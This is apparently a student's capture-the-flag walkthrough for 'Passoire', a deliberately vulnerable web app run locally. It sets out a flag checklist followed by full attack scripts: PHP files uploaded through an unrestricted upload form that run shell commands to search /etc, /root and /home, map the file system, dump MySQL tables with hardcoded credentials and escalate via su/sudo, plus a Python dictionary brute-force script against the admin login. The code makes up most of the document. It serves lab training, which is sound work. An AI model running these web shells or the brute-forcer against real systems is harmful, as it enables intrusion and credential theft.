## INTSEC Phase 3



Here are some ways to exploit weaknesses in Passoire, mostly by uploading .php scripts. The code for all the scripts are in this document (as well as in files in the repo)

[image name] [group name]

 **Pull image and run a container:**

	docker pull [name-of-image]
	docker run -d -e HOST="localhost" -p 8080:80 -p 3002:3002 -p 2222:22 [name-of-image]

### Basic log in

- [ ] Log in as john_doe (with password: 123456)

- [ ] Log in as jane_smith (with password: 12345678)

  Check uploaded files and downloaded secret

  - [ ] flag_7 flag id: 

- [ ] Create your own user

* username:

* password:

### Upload scripts:

- [ ] Check if possible to access index for uploaded files: http://localhost:8080/passoire/uploads/
  - [ ] flag 6. id: 

**Upload** `test.php` (in http://localhost:8080/passoire/file_upload.php)

- [ ] **Run** test.php (http://localhost:8080/passoire/uploads/test.php) - purple/grey php-screen appears
- [ ] Upload and run  ``` file_system_mapper.php``` to get an overview of the file system

**Upload and run** `get_known_flags.php`

- [ ] 'flag 1. id: 

- [ ] flag 3. id: 

- [ ] flag 6. id:

- [ ] flag 9. id: 

- [ ] flag 10. id: 

- [ ] flag 13. id:



**Get password for admin**

- [ ] Password for 'admin' found with `**get_credentials.py**` 

​	Run the script **`get_credentials.py`** (locally) and get the password. Try logging in on web service with credentials

​	Password: 

**Upload and run `get_flag_14.php` (Here we need the password from get_credentials.py)**

- [ ] flag 14. id:

**Upload and run `get_binary_file.php` to get my_cryptographic_algorithm binary file**

​	Save text output in browser as get my_cryptographic_algorithm

​	Run **`base_64_to_binary.py`** to convert the file to binary

​	In the terminal run: `strings cryptographic_algorithm | less`

- [ ] flag 11. id:

**Explore mysql database**

**Upload and run** **`explore_mysql_db.php`** (may require a different password)

- [ ] flag 5. id:



## Scripts

(all php-scripts are uploaded to passoire and run in the web environment)

**`test.php`**

```
<?php
phpinfo();
?>
```

**`get_known_flags.php`**

```
<?php
echo "<pre>";

// Define directories to search (avoiding problematic ones)
$search_dirs = array(
    '/passoire',
    '/etc',
    '/var',
    '/home',
    '/root',
    '/usr'
);

// Format directories for command
$dir_string = implode(' ', $search_dirs);

echo "Searching in directories: " . $dir_string . "\n\n";

// Search for files named flag_*
echo "Searching for files named flag_*:\n";
$find_command = "find $dir_string -name 'flag_*' 2>/dev/null";
$files = shell_exec($find_command);
echo $files . "\n";

// Search through files for flag pattern
echo "\nSearching file contents for flag pattern:\n";
$grep_command = "grep -r 'flag_[0-9]* is [a-f0-9]*' $dir_string 2>/dev/null";
$contents = shell_exec($grep_command);
echo $contents;

echo "</pre>";
?>
```



**`get_credentials.py`** (requires a list(s) of passwords like those in [SecLists](https://github.com/danielmiessler/SecLists). This tries to find the password for the user 'admin'

```
"""get_credentials.py"""
import requests
import time
from urllib.parse import urljoin
from pathlib import Path

def read_password_list(filename):
    """Read passwords from file and return as list"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filename}: {e}")
        return []

def try_login(session, base_url, username, password):
    """Attempt login and return True if successful"""
    login_url = urljoin(base_url, "/passoire/connexion.php")
    
    data = {
        "login": username,
        "password": password
    }
    
    try:
        response = session.post(login_url, data=data, allow_redirects=True)
        
        # Only print progress every 100 attempts to avoid spam
        if try_login.counter % 100 == 0:
            print(f"Attempts made: {try_login.counter}")
        try_login.counter += 1
        
        # Success detection: check if we got redirected to index.php
        if "index.php" in response.url:
            print(f"\nSUCCESS! Password found:")
            print(f"Username: {username}")
            print(f"Password: {password}")
            return True
            
        return False
        
    except requests.exceptions.RequestException as e:
        print(f"Error during login attempt: {e}")
        return False

# Initialize counter as static variable
try_login.counter = 0

def main():
    base_url = "http://localhost:8080"
    #username = "john_doe"
    #username = "jane_smith"
    username = "admin"
    
    # Password list paths
    base_path = Path("/SecLists/Passwords") # Enter path to list of passwords
    password_files = [
        base_path / "2023-200_most_used_passwords.txt",
        base_path / "common_corporate_passwords.lst",
        base_path / "probable-v2-top1575.txt"
    ]
    
    # Security-focused passwords based on chat content
    security_passwords = [
        "passoire", "Passoire2024", "SecureHash2024",
        "Bcrypt123!", "Argon2id", "SecurityFirst",
        "HashMaster", "CryptoExpert", "PasswordHash",
        "Security123", "Crypto2024", "SafePassword",
        # Variations of 'passoire'
        "Passoire123", "passoire123", "PASSOIRE",
        "P@ssoire", "P@ssoire123", "p@ssoire",
        # Security terms
        "Bcrypt", "Argon2", "SHA256",
        "HashFunction", "SecureHash"
    ]
    
    # Collect all passwords
    passwords = set(security_passwords)  # Use set to avoid duplicates
    
    print("Loading password lists...")
    for file in password_files:
        file_passwords = read_password_list(str(file))
        print(f"Loaded {len(file_passwords)} passwords from {file.name}")
        passwords.update(file_passwords)
    
    print(f"\nStarting brute force attack for user: {username}")
    print(f"Testing {len(passwords)} unique passwords...")
    
    session = requests.Session()  # Create one session for all attempts
    
    for password in passwords:
        if try_login(session, base_url, username, password):
            return
        
        # Small delay to avoid overwhelming the server
        time.sleep(0.1)
    
    print("\nNo valid credentials found from password lists.")
    print(f"Total attempts made: {try_login.counter}")

if __name__ == "__main__":
    main()

```

**`get_known_flags.php`**

```
<?php
echo "<pre>";

// Define directories to search (avoiding problematic ones)
$search_dirs = array(
    '/passoire',
    '/etc',
    '/var',
    '/home',
    '/root',
    '/usr'
);

// Format directories for command
$dir_string = implode(' ', $search_dirs);

echo "Searching in directories: " . $dir_string . "\n\n";

// Search for files named flag_*
echo "Searching for files named flag_*:\n";
$find_command = "find $dir_string -name 'flag_*' 2>/dev/null";
$files = shell_exec($find_command);
echo $files . "\n";

// Search through files for flag pattern
echo "\nSearching file contents for flag pattern:\n";
$grep_command = "grep -r 'flag_[0-9]* is [a-f0-9]*' $dir_string 2>/dev/null";
$contents = shell_exec($grep_command);
echo $contents;

echo "</pre>";
?>
```



**`get_flag_14.php`** (be sure to enter the correct password for admin)

```
<?php
echo "<pre>";

$command = "echo 'marshall' | su admin -c 'cat /home/admin/flag_14'";
$output = shell_exec($command);
echo "Output:\n$output\n";

// If that doesn't work, try with sudo
$command2 = "echo '[PASSWORD_FOR_ADMIN]' | sudo -S -u admin cat /home/admin/flag_14";
$output2 = shell_exec($command2);
echo "Sudo output:\n$output2\n";

echo "</pre>";
?>
```



**`base_64_to_binary.py`**

```
# Copy the base64 output from the PHP script into a text file
with open('my_own_cryptographic_algorithm', 'r') as f:
    b64_content = f.read()

# Decode and save as binary
with open('cryptographic_algorithm', 'wb') as f:
    f.write(base64.b64decode(b64_content))
```



**`explore_mysql_db.php`** (could require a password other than 'prince')

```
<?php
echo "<pre>";

try {
    $db = new PDO('mysql:host=127.0.0.1;dbname=passoire', 'passoire', 'prince');
    echo "Connected to MySQL!\n\n";

    // Tables we want to examine
    $tables = array('files', 'links', 'messages', 'userinfos', 'users');

    foreach ($tables as $table) {
        echo "\nExamining table: $table\n";
        echo str_repeat("-", 50) . "\n";

        // First show table structure
        $structure = $db->query("DESCRIBE $table");
        echo "Table structure:\n";
        while ($col = $structure->fetch(PDO::FETCH_ASSOC)) {
            echo "- {$col['Field']} ({$col['Type']})\n";
        }

        // Then show table content
        $content = $db->query("SELECT * FROM $table");
        echo "\nTable content:\n";
        while ($row = $content->fetch(PDO::FETCH_ASSOC)) {
            print_r($row);
        }

        // Also try specific search for flag-related content
        $flagSearch = $db->query("SELECT * FROM $table WHERE CONCAT_WS(' ', " .
            implode(',', array_keys($content->getColumnMeta(0))) .
            ") LIKE '%flag%'");

        if ($flagSearch && $flagSearch->rowCount() > 0) {
            echo "\nFlag-related content found:\n";
            while ($row = $flagSearch->fetch(PDO::FETCH_ASSOC)) {
                print_r($row);
            }
        }
    }

} catch (PDOException $e) {
    echo "Database error: " . $e->getMessage() . "\n";
}

echo "</pre>";
?>
```



**`file_system_mapper.php`**

``````

<?php
echo "<pre>";

// Function to list directory contents with permissions
function list_directory($path, $level = 0) {
    // Create indentation based on level
    $indent = str_repeat("  ", $level);

    echo "$indent📁 $path\n";

    // Get directory contents
    $command = "ls -la " . escapeshellarg($path) . " 2>/dev/null";
    $output = shell_exec($command);

    if ($output) {
        echo $indent . str_replace("\n", "\n$indent", $output) . "\n";
    }
}

// List key directories we're interested in
$directories = array(
    '/passoire',
    '/passoire/web',
    '/passoire/web/uploads',
    '/passoire/crypto-helper',
    '/home',
    '/home/passoire',
    '/var/www',
    '/etc/apache2',
    '/etc/mysql'
);

echo "File System Overview:\n\n";

foreach ($directories as $dir) {
    list_directory($dir);
    echo "\n";
}

// Also show overall directory structure
echo "Directory Tree Structure:\n";
$tree_command = "find /passoire /home/passoire -type d 2>/dev/null | sort";
$tree = shell_exec($tree_command);
echo $tree;

echo "</pre>";
?>
``````

